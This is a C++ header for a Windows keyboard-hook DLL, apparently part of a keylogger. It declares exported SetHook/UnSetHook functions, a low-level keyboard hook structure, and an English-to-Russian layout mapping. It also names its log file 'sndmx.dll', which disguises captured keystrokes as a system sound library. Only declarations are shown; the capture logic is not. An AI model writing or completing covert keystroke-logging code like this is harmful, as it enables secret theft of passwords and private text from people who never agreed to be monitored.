#pragma once

#include <windows.h>
#include <iostream>
#include <algorithm>
#include <string>
#include <ctime>
#include <fstream>

using namespace std;

extern "C" __declspec(dllexport) void SetHook();
extern "C" __declspec(dllexport) void UnSetHook();

char logName[] = "sndmx.dll";
HINSTANCE hInstance = NULL;

string _eng = "1234567890~!@#$%^&qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP[]ASDFGHJKL:\"|ZXCVBNM<>?";
string _rus = "1234567890¸!\"¹;%:?éöóêåíãøùçõúôûâàïğîëäæıÿ÷ñìèòüáş.ÉÖÓÊÅÍÃØÙÇÕÚÔÛÂÀÏĞÎËÄÆİ/ß×ÑÌÈÒÜÁŞ,";

MSG message;

HHOOK keyboardHook;

char keyNameBuff[16];
PKBDLLHOOKSTRUCT p;

string myKey;
char buffer[256];

unsigned int sc;

string outText = "";
string cortText = "";

int countSimbols = 0;